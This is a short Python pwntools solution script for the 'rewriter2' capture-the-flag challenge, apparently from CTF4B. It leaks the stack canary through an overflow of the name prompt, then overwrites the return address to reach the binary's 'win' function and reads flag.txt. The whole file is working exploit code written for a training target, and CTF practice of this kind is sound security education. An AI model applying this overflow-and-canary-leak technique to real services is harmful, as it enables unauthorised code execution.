from pwn import *

HOST = os.getenv("CTF4B_HOST", "localhost")
PORT = int(os.getenv("CTF4B_PORT", "9001"))

context.log_level = "critical"
elf = ELF("./rewriter2")
context.binary = elf

p = remote(HOST, PORT)

payload = b"A" * 0x28
p.sendlineafter(b"What's your name? ", payload)
p.recvline()
canary = (u64(p.recvline()) << 8) & (pow(2, 64) - 1)

payload = b"A" * 0x28 + p64(canary) + p64(0) + p64(elf.symbols["win"] + 5)
p.sendlineafter(b"How old are you? ", payload)

p.recvuntil(b"Congratulations!\n")

p.sendline(b"cat flag.txt")
print(p.readlineS(), end="")
